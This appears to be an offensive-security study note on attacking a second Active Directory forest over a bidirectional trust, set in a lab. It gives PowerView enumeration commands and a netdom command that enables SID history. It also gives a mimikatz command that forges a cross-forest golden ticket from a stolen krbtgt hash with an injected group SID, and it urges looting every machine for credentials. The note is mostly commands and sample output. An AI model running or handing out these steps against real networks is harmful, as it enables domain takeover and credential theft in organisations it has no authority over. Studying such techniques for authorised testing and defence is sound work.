**INTER-FOREST EXPLOTATION CONCEPT EXPLANATION:**

The inter-forest explotation is when you attempt to compromise an additinal forest. For example, let's say we are in the contoso.com forest, however we know about the existance of an other forest, named dev-contoso.com(obiously we want to comprimse this addtional forest). Between forests, the concept of trust also exist, and in our lab we will have a bidirecctional trust between the contoso.com forest and the dev-contoso.com forest. 

**OWNING AN ADDITIONAL FOREST WITH GOLDEN TICKETS:**

With a bidirecctional trust set, we must do the following:
Craft a golden ticket for another forest(dev-contoso.com) with an RID superior of 1000(we must find an existing group in our target forest that has an RID equal or superior than 1000) and with SID history correctly configured(SID history enabled), if our RID is less than 1000 our SID will get filtered regardless of the SID history settings:

```
To check if sidhistory is enabled:
PS C:\> Get-DomainTrust -Domain corp2.com
SourceName : corp2.com
TargetName : corp1.com
TrustType : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : TREAT_AS_EXTERNAL,FOREST_TRANSITIVE   -> if "TREAT_AS_EXTERNAL" appears then sidhistory is enabled, if doesn't appear it is disabled
TrustDirection : Bidirectional
WhenCreated : 4/2/2020 7:05:54 PM
WhenChanged : 4/18/2020 2:22:10 PM

To enable sidhistory in case it was disabled
C:\> netdom trust corp2.com /d:corp1.com /enablesidhistory:yes

C:\> netdom trust <target_domain> /d:<source_domain> /enablesidhistory:yes

Searching for an external domain group with an RID superior of 1000:

PS C:\> Get-DomainForeignGroupMember -Domain corp2.com  -> this will return us with external groups that our user forms part of

PS C:\> Get-DomainGroupMember -Identity "Administrators" -Domain corp2.com  -> this will return us with groups/users that form part of the built-in Administartors group

Another important thing to keep in mind when looking for our target group, is that our target group must be in the "domain local security group".
For example, Domain Admins or Enterprise Admins form part of "global security group"(not "domain local security group"), meaning that if we try to impersonate, we will get filtered regardless of our RID and the sidhistory. 

To create the golden ticket:
mimikatz # kerberos::golden /user:h4x /domain:<origin_domain_name> /sid:<origin_domain_sid> /krbtgt:<origin_domain_krbtgt_ntlm_hash> /sids:<group_with_RID_equal_or_superior_than_1000_sid> /ptt
```

**LINKED MSSQL SERVERS:**

We will first list the linked SQL servers, specified in the "MSSQL Advanced Attacks.md" document, and then we will follow the techinque explained there to get remote code execution of our linked SQL server.


**OTHER POTENTIAL WAYS TO COMPROMISE AN ADDITIONAL FOREST:**

Despite the 2 techinques described here, you can attempt to compromise the additional forest without performing any Active Directory attack. For example you can search for a vulnerable/misconfigured exposed service that you can use as a foothold to that additional forest. So it can vary a lot depending on the scenario.

You can also search for configuration scripts for additional domain credentials, for this rease is very IMPORTANT TO LOOT AT DEEPTH ALL THE MACHINES YOU CAN.
